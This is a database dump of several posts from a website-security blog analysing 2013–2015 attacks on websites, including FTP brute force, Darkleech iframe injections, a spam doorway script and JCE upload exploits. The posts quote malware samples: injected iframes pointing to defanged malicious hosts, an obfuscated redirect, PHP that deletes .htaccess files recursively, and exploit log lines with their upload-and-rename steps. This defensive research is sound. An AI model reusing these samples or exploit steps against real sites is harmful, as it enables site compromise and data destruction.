passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (121, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (122, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (123, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (124, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (125, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (126, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
